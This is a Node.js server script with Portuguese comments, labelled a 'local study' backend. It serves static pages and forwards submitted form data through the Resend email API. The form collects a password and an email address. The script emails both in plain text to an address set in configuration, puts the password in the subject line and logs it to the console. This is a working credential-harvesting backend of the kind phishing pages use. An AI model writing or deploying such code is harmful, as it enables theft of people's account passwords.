// Backend de ESTUDO LOCAL.
// Serve o HTML estático e envia os dados do formulário (senha + e-mail) via Resend.
require("dotenv").config();

const http = require("http");
const fs = require("fs");
const path = require("path");
const { Resend } = require("resend");

const PORT = process.env.PORT || 3000;
const DIR = __dirname;

const TYPES = { ".html": "text/html; charset=utf-8", ".png": "image/png" };

// Inicializa o cliente do Resend com a chave de API do .env
const resend = new Resend(process.env.RESEND_API_KEY);

function lerCorpo(req) {
  return new Promise((resolve, reject) => {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk;
      if (body.length > 1e6) req.destroy(); // ~1MB, evita corpo gigante
    });
    req.on("end", () => resolve(body));
    req.on("error", reject);
  });
}

function json(res, status, obj) {
  res.writeHead(status, { "Content-Type": "application/json; charset=utf-8" });
  res.end(JSON.stringify(obj));
}

const server = http.createServer(async (req, res) => {
  if (req.method === "POST" && req.url === "/enviar") {
    try {
      const body = await lerCorpo(req);
      let dados;
      try {
        dados = JSON.parse(body);
      } catch {
        return json(res, 400, { ok: false, erro: "JSON inválido" });
      }

      const senha = String(dados.senha || "").trim();
      const email = String(dados.email || "").trim();

      if (!senha || !email) {
        return json(res, 400, { ok: false, erro: "senha e e-mail são obrigatórios." });
      }

      await resend.emails.send({
        from: process.env.MAIL_FROM || "onboarding@resend.dev",
        to: process.env.MAIL_TO, // destino definido no .env
        reply_to: email,
        subject: `Novo contato: ${senha}`,
        text: `senha: ${senha}\nE-mail: ${email}\nData: ${new Date().toLocaleString("pt-BR")}`,
      });

      console.log(`Enviado via Resend: ${senha} <${email}>`);
      return json(res, 200, { ok: true });
    } catch (err) {
      console.error("Falha ao enviar e-mail:", err.message);
      return json(res, 500, { ok: false, erro: "Falha ao enviar o e-mail." });
    }
  }

  // Arquivos estáticos (html / png)
  const rota = req.url === "/" ? "/index.html" : req.url;
  const arquivo = path.join(DIR, path.normalize(rota).replace(/^(\.\.[/\\])+/, ""));
  fs.readFile(arquivo, (err, conteudo) => {
    if (err) {
      res.writeHead(404).end("Não encontrado");
      return;
    }
    const ext = path.extname(arquivo).toLowerCase();
    res.writeHead(200, { "Content-Type": TYPES[ext] || "application/octet-stream" });
    res.end(conteudo);
  });
});

server.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});